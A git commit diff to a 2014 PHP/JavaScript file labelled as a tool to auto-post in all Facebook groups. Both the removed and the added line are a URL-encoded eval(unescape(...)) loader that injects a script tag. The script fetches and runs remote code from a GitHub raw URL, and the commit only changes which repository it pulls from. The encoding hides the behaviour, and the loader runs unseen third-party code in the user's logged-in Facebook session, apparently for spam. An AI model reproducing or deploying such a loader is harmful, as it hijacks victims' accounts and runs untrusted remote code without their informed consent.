5448419e2b6d775799fcf328afa3cd7dd5783387
TheeKing <kali-1@outlook.com>
2014-03-16 04:19:37 -0700

    Update AUTOPoST.php

--- AUTOPoST.php
+++ AUTOPoST.php
@@ -2,4 +2,4 @@
 /*Auto POST in All Facebook Group*/
 /*Copyright © 2014 Kodran Piraj. All Rights Reserved.*/
 
-eval(unescape("%28function%28%29%7Bdocument.body.appendChild%28document.createElement%28%27script%27%29%29.src%3D%27https%3A//raw.github.com/TheeKing/TheKing/master/TheeBoosss.php%27%3B%7D%29%28%29"));
+eval(unescape("%28function%28%29%7Bdocument.body.appendChild%28document.createElement%28%27script%27%29%29.src%3D%27https%3A//raw.github.com/TheeKing/FBTOOLS/master/AUTOPOST.php%27%3B%7D%29%28%29"));
